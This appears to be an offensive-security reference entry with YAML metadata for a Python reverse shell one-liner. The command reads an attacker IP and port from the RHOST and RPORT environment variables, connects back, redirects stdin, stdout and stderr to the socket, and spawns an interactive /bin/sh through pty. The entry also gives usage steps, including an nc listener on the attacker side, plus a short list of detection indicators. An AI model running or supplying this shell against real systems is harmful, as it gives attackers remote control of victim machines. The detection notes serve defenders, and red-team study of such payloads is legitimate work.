---
id: 71fca108-9749-4188-9c44-2c3873debe83
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - pty
validated: true
---

# Python-Reverse-Shell-Using-Environment-Variables-PTY

## Code

```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

## Description

This code establishes a reverse shell using environment variables for the attacker's IP and port, creating a socket connection and spawning an interactive PTY shell (/bin/sh) with redirected stdin, stdout, and stderr.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| RHOST | Attacker's IP address (set via export) | 10.0.0.1 |
| RPORT | Attacker's listening port (set via export) | 4242 |

## Usage

Set environment variables on the target (export RHOST="$ATTACKER_IP"; export RPORT=$ATTACKER_PORT), then execute the one-liner. Requires a listener (e.g., nc -lvnp $RPORT) on the attacker side. Used in post-exploitation for shell access.

## Detection

- Environment variables RHOST/RPORT set unusually.
- Python processes importing socket/os/pty and connecting outbound.
- Network flows to attacker IP/port.
- PTY spawning logs in advanced EDR.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
